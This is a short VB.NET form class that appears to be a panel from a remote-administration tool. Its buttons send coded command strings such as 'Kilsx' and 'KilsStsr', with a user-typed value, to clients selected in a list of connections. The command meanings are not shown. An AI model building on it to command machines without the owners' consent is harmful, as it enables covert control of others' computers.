Public Class Form23

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        If Button1.Enabled = False Then
    




            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "Kilsx" & "|U|" & TextBox1.Text)
            Next



            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "Kiloooow" & "|U|" & TextBox1.Text)
            Next



















        End If
        If Button2.Enabled = False Then




            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "KilsStsr" & "|U|" & TextBox1.Text)
            Next

        End If



    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Button1.Enabled = False
        Button2.Enabled = True
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Button2.Enabled = False
        Button1.Enabled = True
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        If Button1.Enabled = False Then


            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "Kiloooow" & "|U|" & TextBox1.Text)
            Next




        End If
        If Button2.Enabled = False Then
        



            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "KilsStsrooow" & "|U|" & TextBox1.Text)
            Next




        End If
    End Sub

    Private Sub Form23_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub
End Class